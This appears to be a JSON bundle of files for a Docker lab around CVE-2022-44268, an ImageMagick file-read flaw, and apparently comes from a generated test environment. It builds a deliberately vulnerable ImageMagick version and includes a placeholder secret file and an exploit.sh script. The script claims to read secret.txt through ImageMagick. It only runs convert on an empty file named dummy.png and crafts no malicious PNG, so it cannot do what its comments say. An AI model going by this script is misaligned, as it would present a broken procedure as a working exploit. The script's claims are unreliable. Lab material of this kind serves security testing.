{
    "files": [
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/docker-compose.yml",
            "content": "version: '3.8'\n\nservices:\n  imagemagick:\n    build: ./imagemagick\n    container_name: imagemagick_vulnerable\n    volumes:\n      - ./data:/data\n    command: [\"/bin/bash\", \"-c\", \"while true; do sleep 1000; done\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/imagemagick/Dockerfile",
            "content": "FROM ubuntu:20.04\n\nENV DEBIAN_FRONTEND=noninteractive\n\nRUN apt-get update && \\\n    apt-get install -y build-essential git autoconf libtool pkg-config libpng-dev && \\\n    apt-get clean\n\n# Clone ImageMagick repository and checkout the specific version\nRUN git clone https://github.com/ImageMagick/ImageMagick.git /ImageMagick && \\\n    cd /ImageMagick && \\\n    git checkout 7.1.0-49 && \\\n    ./configure && \\\n    make && \\\n    make install && \\\n    ldconfig\n\nWORKDIR /data\n\nCMD [\"/bin/bash\"]\n"
        },
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/data/secret.txt",
            "content": "This is a sensitive file that should not be exposed.\n"
        },
        {
            "location": "./../../dockers/CVE-2022-44268/custom_no_tool/data/exploit.sh",
            "content": "#!/bin/bash\n\n# This script demonstrates the exploitation of CVE-2022-44268\n# It attempts to read the contents of secret.txt via ImageMagick\n\n# Create a dummy PNG file\necho \"\" > dummy.png\n\n# Attempt to use ImageMagick to resize the dummy PNG and read secret.txt\nconvert dummy.png -resize 100x100 info:- > output.txt 2>&1\n\n# Display the output, which may contain contents of secret.txt\ncat output.txt\n"
        }
    ],
    "directory_tree": "CVE-2022-44268/\n\u251c\u2500\u2500 custom_no_tool\n\u2502   \u251c\u2500\u2500 data\n\u2502   \u2502   \u251c\u2500\u2500 exploit.sh\n\u2502   \u2502   \u2514\u2500\u2500 secret.txt\n\u2502   \u251c\u2500\u2500 docker-compose.yml\n\u2502   \u2514\u2500\u2500 imagemagick\n\u2502       \u2514\u2500\u2500 Dockerfile\n"
}